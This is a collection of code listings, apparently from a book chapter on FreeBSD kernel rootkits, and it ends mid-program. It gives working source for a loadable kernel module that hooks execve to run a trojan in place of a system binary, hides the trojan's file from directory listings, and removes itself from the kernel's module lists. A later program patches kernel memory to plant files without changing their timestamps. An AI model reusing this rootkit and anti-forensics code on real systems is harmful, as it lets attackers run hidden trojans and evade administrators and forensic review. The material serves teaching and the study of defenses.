["```\n#include <stdio.h>\n\nint main(int argc, char *argv[])\n{\n        printf(\"May the force be with you.\\n\");\n        return(0);\n}\n\n```", "```\n#include <stdio.h>\n\nint main(int argc, char *argv[])\n{\n        printf(\"May the schwartz be with you!\\n\");\n        return(0);\n}\n\n```", "```\nint\nexecve(td, uap)\n        struct thread *td;\n        struct execve_args /* {\n                char *fname;\n                char **argv;\n                char **envv;\n        } */ *uap;\n{\n        int error;\n        struct image_args args;\n\n        ❶error = exec_copyin_args(&args, uap->fname, UIO_USERSPACE,\n            uap->argv, uap->envv);\n\n        if (error == 0)\n                 ❷error = kern_execve(td, &args, NULL);\n\n        exec_free_args(&args);\n\n        return (error);\n}\n\n```", "```\n#include <sys/types.h>\n#include <sys/param.h>\n#include <sys/proc.h>\n#include <sys/module.h>\n#include <sys/sysent.h>\n#include <sys/kernel.h>\n#include <sys/systm.h>\n#include <sys/syscall.h>\n#include <sys/sysproto.h>\n\n#include <vm/vm.h>\n#include <vm/vm_page.h>\n#include <vm/vm_map.h>\n\n#define ORIGINAL        \"/sbin/hello\"\n#define TROJAN          \"/sbin/trojan_hello\"\n\n/*\n * execve system call hook.\n * Redirects the execution of ORIGINAL into TROJAN.\n*/\nstatic int\nexecve_hook(struct thread *td, void *syscall_args)\n{\n        struct execve_args /* {\n                char *fname;\n                char **argv;\n                char **envv;\n        } */ *uap;\n        uap = (struct execve_args *)syscall_args;\n\n        struct execve_args kernel_ea;\n        struct execve_args *user_ea;\n        struct vmspace *vm;\n        vm_offset_t base, addr;\n        char t_fname[] = TROJAN;\n\n        /* Redirect this process? */\n        ❶if (strcmp(uap->fname, ORIGINAL) == 0) {\n                /*\n                 * Determine the end boundary address of the current\n                 * process's user data space.\n                 */\n                vm = curthread->td_proc->p_vmspace;\n                base = round_page((vm_offset_t) vm->vm_daddr);\n                ❷addr = base + ctob(vm->vm_dsize);\n\n                /*\n                 * Allocate a PAGE_SIZE null region of memory for a new set\n                 * of execve arguments.\n                 */\n                 ❸vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE,\n                    VM_PROT_ALL, VM_PROT_ALL, 0);\n                vm->vm_dsize += btoc(PAGE_SIZE);\n\n                /*\n                 * Set up an execve_args structure for TROJAN. Remember, you\n                 * have to place this structure into user space, and because\n                 * you can't point to an element in kernel space once you are\n                 * in user space, you'll have to place any new \"arrays\" that\n                 * this structure points to in user space as well.\n                 */\n                ❹copyout(&t_fname, (char *)addr, strlen(t_fname));\n                kernel_ea.fname = (char *)addr;\n                kernel_ea.argv = uap->argv;\n                kernel_ea.envv = uap->envv;\n\n                /* Copy out the TROJAN execve_args structure. */\n                user_ea = (struct execve_args *)addr + sizeof(t_fname);\n                ❺copyout(&kernel_ea, user_ea, sizeof(struct execve_args));\n\n                /* Execute TROJAN. */\n                ❻return(execve(curthread, user_ea));\n        }\n        return(execve(td, syscall_args));\n\n}\n\n/* The function called at load/unload. */\nstatic int\nload(struct module *module, int cmd, void *arg)\n{\n        sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;\n\n        return(0);\n\n}\n\nstatic moduledata_t incognito_mod = {\n        \"incognito\",            /* module name */\n        load,                   /* event handler */\n        NULL                    /* extra data */\n};\n\nDECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);\n\n```", "```\n`$ hello`\nMay the force be with you.\n`$ trojan_hello`\nMay the schwartz be with you!\n`$ sudo kldload ./incognito-0.1.ko $ hello`\nMay the schwartz be with you!\n\n```", "```\nint\ngetdirentries(td, uap)\n        struct thread *td;\n        register struct getdirentries_args /* {\n                int fd;\n                char *buf;\n                u_int count;\n                long *basep;\n        } */ *uap;\n{\n        struct vnode *vp;\n        struct file *fp;\n        struct uio auio;\n        struct iovec aiov;\n        int vfslocked;\n        long loff;\n        int error, eofflag;\n\n        if ((error = getvnode(td->td_proc->p_fd, uap->fd, &fp)) != 0)\n                return (error);\n        if ((fp->f_flag & FREAD) == 0) {\n                fdrop(fp, td);\n                return (EBADF);\n        }\n        vp = fp->f_vnode;\nunionread:\n        vfslocked = VFS_LOCK_GIANT(vp->v_mount);\n        if (vp->v_type != VDIR) {\n                error = EINVAL;\n                goto fail;\n        }\n        aiov.iov_base = uap->buf;\n        aiov.iov_len = uap->count;\n        auio.uio_iov = &aiov;\n        auio.uio_iovcnt = 1;\n        auio.uio_rw = UIO_READ;\n        auio.uio_segflg = UIO_USERSPACE;\n        auio.uio_td = td;\n        auio.uio_resid = uap->count;\n        /* vn_lock(vp, LK_SHARED | LK_RETRY, td); */\n        vn_lock(vp, LK_EXCLUSIVE | LK_RETRY, td);\n        loff = auio.uio_offset = fp->f_offset;\n#ifdef MAC\n        error = mac_check_vnode_readdir(td->td_ucred, vp);\n        if (error == 0)\n#endif\n                error = VOP_READDIR(vp, &auio, fp->f_cred, &eofflag, NULL,\n                    NULL);\n        fp->f_offset = auio.uio_offset;\n        VOP_UNLOCK(vp, 0, td);\n        if (error)\n                goto fail;\n        if (uap->count == auio.uio_resid) {\n                if (union_dircheckp) {\n                        error = union_dircheckp(td, &vp, fp);\n                        if (error == −1) {\n                                VFS_UNLOCK_GIANT(vfslocked);\n                                goto unionread;\n                        }\n                        if (error)\n                                goto fail;\n                }\n                /*\n                 * XXX We could delay dropping the lock above but\n                 * union_dircheckp complicates things.\n                 */\n                vn_lock(vp, LK_EXCLUSIVE | LK_RETRY, td);\n                if ((vp->v_vflag & VV_ROOT) &&\n                    (vp->v_mount->mnt_flag & MNT_UNION)) {\n                        struct vnode *tvp = vp;\n                        vp = vp->v_mount->mnt_vnodecovered;\n                        VREF(vp);\n                        fp->f_vnode = vp;\n                        fp->f_data = vp;\n                        fp->f_offset = 0;\n                        vput(tvp);\n                        VFS_UNLOCK_GIANT(vfslocked);\n                        goto unionread;\n                }\n                VOP_UNLOCK(vp, 0, td);\n        }\n        if (uap->basep != NULL) {\n                error = copyout(&loff, uap->basep, sizeof(long));\n        }\n        ❶td->td_retval[0] = uap->count - auio.uio_resid;\nfail:\n        VFS_UNLOCK_GIANT(vfslocked);\n        fdrop(fp, td);\n        return (error);\n}\n\n```", "```\nstruct dirent {\n        __uint32_t d_fileno;            /* inode number */\n        __uint16_t d_reclen;            /* length of this directory entry */\n        __uint8_t  d_type;              /* file type */\n        __uint8_t  d_namlen;            /* length of the filename */\n#if __BSD_VISIBLE\n#define MAXNAMLEN       255\n        char    d_name[MAXNAMLEN + 1];  /* filename */\n#else\n        char    d_name[255 + 1];        /* filename */\n#endif\n};\n\n```", "```\n#include <sys/types.h>\n#include <sys/param.h>\n#include <sys/proc.h>\n#include <sys/module.h>\n#include <sys/sysent.h>\n#include <sys/kernel.h>\n#include <sys/systm.h>\n#include <sys/syscall.h>\n#include <sys/sysproto.h>\n#include <sys/malloc.h>\n\n#include <vm/vm.h>\n#include <vm/vm_page.h>\n#include <vm/vm_map.h>\n\n#include <dirent.h>\n\n#define ORIGINAL        \"/sbin/hello\"\n#define TROJAN          \"/sbin/trojan_hello\"\n#define T_NAME          \"trojan_hello\"\n\n/*\n * execve system call hook.\n * Redirects the execution of ORIGINAL into TROJAN.\n */\nstatic int\nexecve_hook(struct thread *td, void *syscall_args)\n{\n. . .\n}\n\n/*\n * getdirentries system call hook.\n * Hides the file T_NAME.\n */\nstatic int\ngetdirentries_hook(struct thread *td, void *syscall_args)\n{\n        struct getdirentries_args /* {\n                int fd;\n                char *buf;\n                u_int count;\n                long *basep;\n        } */ *uap;\n        uap = (struct getdirentries_args *)syscall_args;\n\n        struct dirent *dp, *current;\n        unsigned int size, count;\n\n        /*\n         * Store the directory entries found in fd in buf, and record the\n         * number of bytes actually transferred.\n         */\n        ❶getdirentries(td, syscall_args);\n        size = td->td_retval[0];\n\n        /* Does fd actually contain any directory entries? */\n        ❷if (size > 0) {\n                MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);\n                ❸copyin(uap->buf, dp, size);\n\n                current = dp;\n                count = size;\n\n                /*\n                 * Iterate through the directory entries found in fd.\n                 * Note: The last directory entry always has a record length\n                 * of zero.\n                 */\n                while ((current->d_reclen != 0) && (count > 0)) {\n                        count -= current->d_reclen;\n\n                        /* Do we want to hide this file? */\n                        ❹if(strcmp((char *)&(current->d_name), T_NAME) == 0)\n                       {\n                                /*\n                                 * Copy every directory entry found after\n                                 * T_NAME over T_NAME, effectively cutting it\n                                 * out.\n                                 */\n                                if (count != 0)\n                                        ❺bcopy((char *)current +\n                                            current->d_reclen, current,\n                                            count);\n\n                                size -= current->d_reclen;\n                                break;\n                        }\n\n                        /*\n                         * Are there still more directory entries to\n                         * look through?\n                         */\n                        if (count != 0)\n                                /* Advance to the next record. */\n                                current = (struct dirent *)((char *)current +\n                                    current->d_reclen);\n\n                }\n\n                /*\n\n                 * If T_NAME was found in fd, adjust the \"return values\" to\n                 * hide it. If T_NAME wasn't found...don't worry 'bout it.\n                 */\n                ❻td->td_retval[0] = size;\n                ❼copyout(dp, uap->buf, size);\n\n                FREE(dp, M_TEMP);\n        }\n\n        return(0);\n}\n\n/* The function called at load/unload. */\nstatic int\nload(struct module *module, int cmd, void *arg)\n{\n        sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;\n        sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;\n\n        return(0);\n}\nstatic moduledata_t incognito_mod = {\n        \"incognito\",            /* module name */\n        load,                   /* event handler */\n        NULL                    /* extra data */\n};\n\nDECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);\n\n```", "```\n`$ ls /sbin/t*`\n/sbin/trojan_hello /sbin/tunefs\n`$ sudo kldload ./incognito-0.2.ko $ hello`\nMay the schwartz be with you!\n`$ ls /sbin/t*`\n/sbin/tunefs\n\n```", "```\n$ `kldstat`\nId Refs Address    Size     Name\n 1    4 0xc0400000 63070c   kernel\n 2   16 0xc0a31000 568dc    acpi.ko\n 3    1 0xc1ebc000 2000     incognito-0.2.ko\n\n```", "```\nstatic linker_file_list_t linker_files;\n\n```", "```\ntypedef TAILQ_HEAD(, linker_file) linker_file_list_t;\n\n```", "```\nstatic int next_file_id = 1;\n\n```", "```\nextern struct mtx Giant;\n\n```", "```\n$ `kldstat`\nId Refs Address    Size     Name\n 1    3 0xc0400000 63070c   kernel\n 2   16 0xc0a31000 568dc    acpi.ko\n$ `sudo kldload ./incognito-0.2.ko`\n$ `kldstat`\nId Refs Address    Size     Name\n 1    4 0xc0400000 63070c   kernel\n 2   16 0xc0a31000 568dc    acpi.ko\n 3    1 0xc1e89000 2000     incognito-0.2.ko\n\n```", "```\nstatic modulelist_t modules;\n\n```", "```\ntypedef TAILQ_HEAD(, module) modulelist_t;\n\n```", "```\nstatic int nextid = 1;\n\n```", "```\nextern struct sx modules_sx;\n\n```", "```\n#include <sys/types.h>\n#include <sys/param.h>\n#include <sys/proc.h>\n#include <sys/module.h>\n#include <sys/sysent.h>\n#include <sys/kernel.h>\n#include <sys/systm.h>\n#include <sys/syscall.h>\n#include <sys/sysproto.h>\n#include <sys/malloc.h>\n\n#include <sys/linker.h>\n#include <sys/lock.h>\n#include <sys/mutex.h>\n\n#include <vm/vm.h>\n#include <vm/vm_page.h>\n#include <vm/vm_map.h>\n\n#include <dirent.h>\n\n#define ORIGINAL        \"/sbin/hello\"\n#define TROJAN          \"/sbin/trojan_hello\"\n#define T_NAME          \"trojan_hello\"\n#define VERSION         \"incognito-0.3.ko\"\n\n/*\n * The following is the list of variables you need to reference in order\n * to hide this module, which aren't defined in any header files.\n */\nextern linker_file_list_t linker_files;\nextern struct mtx kld_mtx;\nextern int next_file_id;\ntypedef TAILQ_HEAD(, module) modulelist_t;\nextern modulelist_t modules;\nextern int nextid;\nstruct module {\n        TAILQ_ENTRY(module)     link;    /* chain together all modules */\n        TAILQ_ENTRY(module)     flink;   /* all modules in a file */\n        struct linker_file      *file;   /* file which contains this module */\n        int                     refs;    /* reference count */\n        int                     id;      /* unique id number */\n        char                    *name;   /* module name */\n        modeventhand_t          handler; /* event handler */\n        void                    *arg;    /* argument for handler */\n        modspecific_t           data;    /* module specific data */\n};\n\n/*\n * execve system call hook.\n * Redirects the execution of ORIGINAL into TROJAN.\n */\nstatic int\nexecve_hook(struct thread *td, void *syscall_args)\n{\n. . .\n}\n\n/*\n * getdirentries system call hook.\n * Hides the file T_NAME.\n */\nstatic int\ngetdirentries_hook(struct thread *td, void *syscall_args)\n{\n. . .\n}\n\n/* The function called at load/unload. */\nstatic int\nload(struct module *module, int cmd, void *arg)\n{\n        struct linker_file *lf;\n        struct module *mod;\n\n        mtx_lock(&Giant);\n        mtx_lock(&kld_mtx);\n\n        /* Decrement the current kernel image's reference count. */\n        (&linker_files)->tqh_first->refs--;\n\n        /*\n         * Iterate through the linker_files list, looking for VERSION.\n         * If found, decrement next_file_id and remove from list.\n         */\n        TAILQ_FOREACH(lf, &linker_files, link) {\n                if (strcmp(lf->filename, VERSION) == 0) {\n                        next_file_id--;\n                        TAILQ_REMOVE(&linker_files, lf, link);\n                        break;\n                }\n        }\n\n        mtx_unlock(&kld_mtx);\n        mtx_unlock(&Giant);\n\n        sx_xlock(&modules_sx);\n\n        /*\n         * Iterate through the modules list, looking for \"incognito.\"\n         * If found, decrement nextid and remove from list.\n         */\n        TAILQ_FOREACH(mod, &modules, link) {\n                if (strcmp(mod->name, \"incognito\") == 0) {\n                        nextid--;\n                        TAILQ_REMOVE(&modules, mod, link);\n                        break;\n                }\n        }\n\n        sx_xunlock(&modules_sx);\n\n        sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;\n\t\tsysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;\n\n        return(0);\n}\n\nstatic moduledata_t incognito_mod = {\n        \"incognito\",            /* module name */\n        load,                   /* event handler */\n        NULL                    /* extra data */\n};\n\nDECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);\n\n```", "```\n$ `kldstat`\nId Refs Address    Size     Name\n 1    3 0xc0400000 63070c   kernel\n 2   16 0xc0a31000 568dc    acpi.ko\n$ `sudo kldload ./incognito-0.3.ko`\n$ `hello`\nMay the schwartz be with you!\n$ `ls /sbin/t*`\n/sbin/tunefs\n$ `kldstat`\nId Refs Address    Size     Name\n 1    3 0xc0400000 63070c   kernel\n 2   16 0xc0a31000 568dc    acpi.ko\n\n```", "```\n#include <errno.h>\n#include <stdio.h>\n#include <sys/time.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n\nint\nmain(int argc, char *argv[])\n{\nstruct stat sb;\nstruct timeval time[2];\n\n\t   ❶if (stat(\"/sbin\", &sb) < 0) {\n                     fprintf(stderr, \"STAT ERROR: %d\\n\", errno);\n                     exit(-1);\n\n\t   }\n\n\t   ❷time[0].tv_sec = sb.st_atime;\n\t   time[1].tv_sec = sb.st_mtime;\n\n\t   /*\n\t    * Do something to /sbin/.\n\t    */\n\n        ❸if (utimes(\"/sbin\", (struct timeval *)&time) < 0) {\n\t\t\t\t\t  fprintf(stderr, \"UTIMES ERROR: %d\\n\", errno);\n\t\t\t\t\t  exit(-1);\n\t\t}\n\n\t\texit(0);\n}\n\n```", "```\ntime_t    st_atime;           /* time of last access */\ntime_t    st_mtime;\t\t\t  /* time of last data modification */\n\n```", "```\nstruct timeval {\n        long          tv_sec;      /* seconds */\n        suseconds_t   tv_usec;     /* and microseconds */\n};\n\n```", "```\nvoid\nufs_itimes(vp)\n\t\tstruct vnode *vp;\n{\n\t\tstruct inode *ip;\n\t\tstruct timespec ts;\n\n\t\tip = VTOI(vp);\n\t\tif ((ip->i_flag &(IN_ACCESS | IN_CHANGE | IN_UPDATE)) == 0)\n\t\t\t    return;\n\t\tif ((vp->v_type == VBLK || vp->v_type == VCHR) && !DOINGSOFTDEP(vp))\n\t\t\t\tip->i_flag |= IN_LAZYMOD;\n\t\telse\n\t\t\t\tip->i_flag |= IN_MODIFIED;\n\t\tif ((vp->v_mount->mnt_flag & MNT_RDONLY) == 0) {\n\t\t\t\tvfs_timestamp(&ts);\n\t\t\t\tif (ip->i_flag &IN_ACCESS) {\n\t\t\t\tDIP_SET(ip, i_atime, ts.tv_sec);\n\t\t\t\tDIP_SET(ip, i_atimensec, ts.tv_nsec);\n}\n\t\tif (ip->i_flag &IN_UPDATE) {\n\t\t\t\tDIP_SET(ip, i_mtime, ts.tv_sec);\n\t\t\t\tDIP_SET(ip, i_mtimensec, ts.tv_nsec);\n\t\t\t\tip->i_modrev++;\n\t\t}\n\t\tif (ip->i_flag &IN_CHANGE) {\n\t\t`DIP_SET(ip, i_ctime, ts.tv_sec);         DIP_SET(ip, i_ctimensec, ts.tv_nsec);`\n\t\t}\n\t}\n\tip->i_flag &= ~(IN_ACCESS | IN_CHANGE | IN_UPDATE);\n}\n\n```", "```\n`$ nm /boot/kernel/kernel | grep ufs_itimes`\nc06c0e60 T ufs_itimes\n`$ objdump -d --start-address=0xc06c0e60 /boot/kernel/kernel`\n\n/boot/kernel/kernel: file format elf32-i386-freebsd\n\nDisassembly of section .text:\n\nc06c0e60 <ufs_itimes>:\nc06c0e60:       55                      push   %ebp\nc06c0e61:       89 e5                   mov    %esp,%ebp\nc06c0e63:       83 ec 14                sub    $0x14,%esp\nc06c0e66:       89 5d f8                mov    %ebx,0xfffffff8(%ebp)\nc06c0e69:       8b 4d 08                mov    0x8(%ebp),%ecx\nc06c0e6c:       89 75 fc                mov    %esi,0xfffffffc(%ebp)\nc06c0e6f:       8b 59 0c                mov    0xc(%ecx),%ebx\nc06c0e72:       8b 53 10                mov    0x10(%ebx),%edx\nc06c0e75:       f6 c2 07                test   $0x7,%dl\nc06c0e78:       74 1f                   je     c06c0e99 <ufs_itimes+0x39>\nc06c0e7a:       8b 01                   mov    (%ecx),%eax\nc06c0e7c:       83 e8 03                sub    $0x3,%eax\nc06c0e7f:       83 f8 01                cmp    $0x1,%eax\nc06c0e82:       76 1f                   jbe    c06c0ea3 <ufs_itimes+0x43>\nc06c0e84:       83 ca 08                or     $0x8,%edx\nc06c0e87:       89 53 10                mov    %edx,0x10(%ebx)\nc06c0e8a:       8b 41 10                mov    0x10(%ecx),%eax\nc06c0e8d:       f6 40 6c 01             testb  $0x1,0x6c(%eax)\nc06c0e91:       74 2d                   je     c06c0ec0 <ufs_itimes+0x60>\nc06c0e93:       83 e2 f8                and    $0xfffffff8,%edx\nc06c0e96:       89 53 10                mov    %edx,0x10(%ebx)\nc06c0e99:       8b 5d f8                mov    0xfffffff8(%ebp),%ebx\nc06c0e9c:       8b 75 fc                mov    0xfffffffc(%ebp),%esi\nc06c0e9f:       89 ec                   mov    %ebp,%esp\nc06c0ea1:       5d                      pop    %ebp\nc06c0ea2:       c3                      ret\nc06c0ea3:       8b 41 10                mov    0x10(%ecx),%eax\nc06c0ea6:       f6 40 6e 20             testb  $0x20,0x6e(%eax)\nc06c0eaa:       75 d8                   jne    c06c0e84 <ufs_itimes+0x24>\nc06c0eac:       83 ca 40                or     $0x40,%edx\nc06c0eaf:       89 53 10                mov    %edx,0x10(%ebx)\nc06c0eb2:       8b 41 10                mov    0x10(%ecx),%eax\nc06c0eb5:       f6 40 6c 01             testb  $0x1,0x6c(%eax)\nc06c0eb9:       75 d8                   jne    c06c0e93 <ufs_itimes+0x33>\nc06c0ebb:       90                      nop\nc06c0ebc:       8d 74 26 00             lea    0x0(%esi),%esi\nc06c0ec0:       8d 75 f0                lea    0xfffffff0(%ebp),%esi\nc06c0ec3:       89 34 24                mov    %esi,(%esp)\nc06c0ec6:       e8 f5 08 ef ff          call   c05b17c0 <vfs_timestamp>\nc06c0ecb:       8b 53 10                mov    0x10(%ebx),%edx\nc06c0ece:       f6 c2 01                test   $0x1,%dl\nc06c0ed1:       74 3d                   je     c06c0f10 <ufs_itimes+0xb0>\nc06c0ed3:       8b 43 0c                mov    0xc(%ebx),%eax\nc06c0ed6:       83 78 14 01             cmpl   $0x1,0x14(%eax)\nc06c0eda:       0f 84 bd 00 00 00       je     c06c0f9d <ufs_itimes+0x13d>\nc06c0ee0:       8b 45 f0                mov    0xfffffff0(%ebp),%eax\nc06c0ee3:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx\nc06c0ee9:       89 c1                   mov    %eax,%ecx\n`c06c0eeb:       89 42 20                mov    %eax,0x20(%edx)`\nc06c0eee:       c1 f9 1f                sar    $0x1f,%ecx\n`c06c0ef1:       89 4a 24                mov    %ecx,0x24(%edx)`\nc06c0ef4:       8b 43 0c                mov    0xc(%ebx),%eax\nc06c0ef7:       83 78 14 01             cmpl   $0x1,0x14(%eax)\nc06c0efb:       0f 84 f1 00 00 00       je     c06c0ff2 <ufs_itimes+0x192>\nc06c0f01:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx\nc06c0f07:       8b 46 04                mov    0x4(%esi),%eax\nc06c0f0a:       89 42 44                mov    %eax,0x44(%edx)\nc06c0f0d:       8b 53 10                mov    0x10(%ebx),%edx\nc06c0f10:       f6 c2 04                test   $0x4,%dl\nc06c0f13:       74 45                   je     c06c0f5a <ufs_itimes+0xfa>\nc06c0f15:       8b 43 0c                mov    0xc(%ebx),%eax\nc06c0f18:       83 78 14 01             cmpl   $0x1,0x14(%eax)\nc06c0f1c:       0f 84 bf 00 00 00       je     c06c0fe1 <ufs_itimes+0x181>\nc06c0f22:       8b 45 f0                mov    0xfffffff0(%ebp),%eax\nc06c0f25:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx\nc06c0f2b:       89 c1                   mov    %eax,%ecx\n`c06c0f2d:       89 42 28                mov    %eax,0x28(%edx)`\nc06c0f30:       c1 f9 1f                sar    $0x1f,%ecx\n`c06c0f33:       89 4a 2c                mov    %ecx,0x2c(%edx)`\nc06c0f36:       8b 43 0c                mov    0xc(%ebx),%eax\nc06c0f39:       83 78 14 01             cmpl   $0x1,0x14(%eax)\nc06c0f3d:       0f 84 8d 00 00 00       je     c06c0fd0 <ufs_itimes+0x170>\nc06c0f43:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx\nc06c0f49:       8b 46 04                mov    0x4(%esi),%eax\nc06c0f4c:       89 42 40                mov    %eax,0x40(%edx)\nc06c0f4f:       83 43 2c 01             addl   $0x1,0x2c(%ebx)\nc06c0f53:       8b 53 10                mov    0x10(%ebx),%edx\nc06c0f56:       83 53 30 00             adcl   $0x0,0x30(%ebx)\nc06c0f5a:       f6 c2 02                test   $0x2,%dl\nc06c0f5d:       0f 84 30 ff ff ff       je     c06c0e93 <ufs_itimes+0x33>\nc06c0f63:       8b 43 0c                mov    0xc(%ebx),%eax\nc06c0f66:       83 78 14 01             cmpl   $0x1,0x14(%eax)\nc06c0f6a:       74 56                   je     c06c0fc2 <ufs_itimes+0x162>\nc06c0f6c:       8b 45 f0                mov    0xfffffff0(%ebp),%eax\nc06c0f6f:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx\nc06c0f75:       89 c1                   mov    %eax,%ecx\n`c06c0f77:       89 42 30                mov    %eax,0x30(%edx)`\nc06c0f7a:       c1 f9 1f                sar    $0x1f,%ecx\n`c06c0f7d:       89 4a 34                mov    %ecx,0x34(%edx)`\nc06c0f80:       8b 43 0c                mov    0xc(%ebx),%eax\nc06c0f83:       83 78 14 01             cmpl   $0x1,0x14(%eax)\nc06c0f87:       74 25                   je     c06c0fae <ufs_itimes+0x14e>\nc06c0f89:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx\nc06c0f8f:       8b 46 04                mov    0x4(%esi),%eax\nc06c0f92:       89 42 48                mov    %eax,0x48(%edx)\nc06c0f95:       8b 53 10                mov    0x10(%ebx),%edx\nc06c0f98:       e9 f6 fe ff ff          jmp    c06c0e93 <ufs_itimes+0x33>\nc06c0f9d:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx\nc06c0fa3:       8b 45 f0                mov    0xfffffff0(%ebp),%eax\nc06c0fa6:       89 42 10                mov    %eax,0x10(%edx)\nc06c0fa9:       e9 46 ff ff ff          jmp    c06c0ef4 <ufs_itimes+0x94>\nc06c0fae:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx\nc06c0fb4:       8b 46 04                mov    0x4(%esi),%eax\nc06c0fb7:       89 42 24                mov    %eax,0x24(%edx)\nc06c0fba:       8b 53 10                mov    0x10(%ebx),%edx\nc06c0fbd:       e9 d1 fe ff ff          jmp    c06c0e93 <ufs_itimes+0x33>\nc06c0fc2:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx\nc06c0fc8:       8b 45 f0                mov    0xfffffff0(%ebp),%eax\nc06c0fcb:       89 42 20                mov    %eax,0x20(%edx)\nc06c0fce:       eb b0                   jmp    c06c0f80 <ufs_itimes+0x120>\nc06c0fd0:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx\nc06c0fd6:       8b 46 04                mov    0x4(%esi),%eax\nc06c0fd9:       89 42 1c                mov    %eax,0x1c(%edx)\nc06c0fdc:       e9 6e ff ff ff          jmp    c06c0f4f <ufs_itimes+0xef>\nc06c0fe1:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx\nc06c0fe7:       8b 45 f0                mov    0xfffffff0(%ebp),%eax\nc06c0fea:       89 42 18                mov    %eax,0x18(%edx)\nc06c0fed:       e9 44 ff ff ff          jmp    c06c0f36 <ufs_itimes+0xd6>\nc06c0ff2:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx\nc06c0ff8:       8b 46 04                mov    0x4(%esi),%eax\nc06c0ffb:       89 42 14                mov    %eax,0x14(%edx)\nc06c0ffe:       e9 0a ff ff ff          jmp    c06c0f0d <ufs_itimes+0xad>\nc06c1003:       8d b6 00 00 00 00       lea    0x0(%esi),%esi\nc06c1009:       8d bc 27 00 00 00 00    lea    0x0(%edi),%edi\n\n```", "```\n#include <errno.h>\n#include <fcntl.h>\n#include <kvm.h>\n#include <limits.h>\n#include <nlist.h>\n#include <stdio.h>\n#include <sys/time.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n\n#define SIZE            450\n#define T_NAME          \"trojan_hello\"\n#define DESTINATION     \"/sbin/.\"\n\n/* Replacement code. */\nunsigned char nop_code[] =\n        \"\\x90\\x90\\x90\";         /* nop          */\n\nint\nmain(int argc, char *argv[])\n{\n        int i, offset1, offset2;\n        char errbuf[_POSIX2_LINE_MAX];\n        kvm_t *kd;\n        struct nlist nl[] = { {NULL}, {NULL}, };\n        unsigned char ufs_itimes_code[SIZE];\n\n        struct stat sb;\n        struct timeval time[2];\n\n        /* Initialize kernel virtual memory access. */\n        kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);\n        if (kd == NULL) {\n                fprintf(stderr, \"ERROR:      %s\\n\", errbuf);\n                exit(-1);\n        }\n\n        nl[0].n_name = \"ufs_itimes\";\n\n        if (kvm_nlist(kd, nl) < 0) {\n                fprintf(stderr, \"ERROR: %s\\n\", kvm_geterr(kd));\n                exit(-1);\n        }\n\n        if (!nl[0].n_value) {\n                fprintf(stderr, \"ERROR: Symbol %s not found\\n\",\n                    nl[0].n_name);\n                exit(-1);\n        }\n\n        /* Save a copy of ufs_itimes. */\n        if (kvm_read(kd, nl[0].n_value, ufs_itimes_code, SIZE) < 0) {\n                fprintf(stderr, \"ERROR: %s\\n\", kvm_geterr(kd));\n                exit(-1);\n        }\n\n        /*\n         * Search through ufs_itimes for the following two lines:\n         *         DIP_SET(ip, i_ctime, ts.tv_sec);\n         *         DIP_SET(ip, i_ctimensec, ts.tv_nsec);\n         */\n        for (i = 0; i < SIZE - 2; i++) {\n                if (ufs_itimes_code[i] == 0x89 &&\n                    ufs_itimes_code[i+1] == 0x42 &&\n                    ufs_itimes_code[i+2] == 0x30)\n                        offset1 = i;\n\n                if (ufs_itimes_code[i] == 0x89 &&\n                    ufs_itimes_code[i+1] == 0x4a &&\n                    ufs_itimes_code[i+2] == 0x34)\n                        offset2 = i;\n        }\n\n        /* Save /sbin/'s access and modification times. */\n        if (stat(\"/sbin\", &sb) < 0) {\n                fprintf(stderr, \"STAT ERROR: %d\\n\", errno);\n                exit(-1);\n        }\n\n        time[0].tv_sec = sb.st_atime;\n        time[1].tv_sec = sb.st_mtime;\n\n        /* Patch ufs_itimes. */\n        if (kvm_write(kd, nl[0].n_value + offset1, nop_code,\n            sizeof(nop_code) - 1) < 0) {\n                fprintf(stderr, \"ERROR: %s\\n\", kvm_geterr(kd));\n                exit(-1);\n        }\n\n        if (kvm_write(kd, nl[0].n_value + offset2, nop_code,\n            sizeof(nop_code) - 1) < 0) {\n                fprintf(stderr, \"ERROR: %s\\n\", kvm_geterr(kd));\n                exit(-1);\n        }\n        /* Copy T_NAME into DESTINATION. */\n        char string[] = \"cp\" \" \" T_NAME \" \" DESTINATION;\n        system(&string);\n\n        /* Roll back /sbin/'s access and modification times. */\n        if (utimes(\"/sbin\", (struct timeval *)&time) < 0) {\n                fprintf(stderr, \"UTIMES ERROR: %d\\n\", errno);\n                exit(-1);\n        }\n\n        /* Restore ufs_itimes. */\n        if (kvm_write(kd, nl[0].n_value + offset1, &ufs_itimes_code[offset1],\n            sizeof(nop_code) - 1) < 0) {\n                fprintf(stderr, \"ERROR: %s\\n\", kvm_geterr(kd));\n                exit(-1);\n        }\n\n        if (kvm_write(kd, nl[0].n_value + offset2, &ufs_itimes_code[offset2],\n            sizeof(nop_code) - 1) < 0) {\n                fprintf(stderr, \"ERROR: %s\\n\", kvm_geterr(kd));\n                exit(-1);\n        }\n\n        /* Close kd. */\n        if (kvm_close(kd) < 0) {\n                fprintf(stderr, \"ERROR: %s\\n\", kvm_geterr(kd));\n                exit(-1);\n        }\n\n        /* Print out a debug message, indicating our success. */\n        printf(\"Y'all just mad. Because today, you suckers got served.\\n\");\n\n        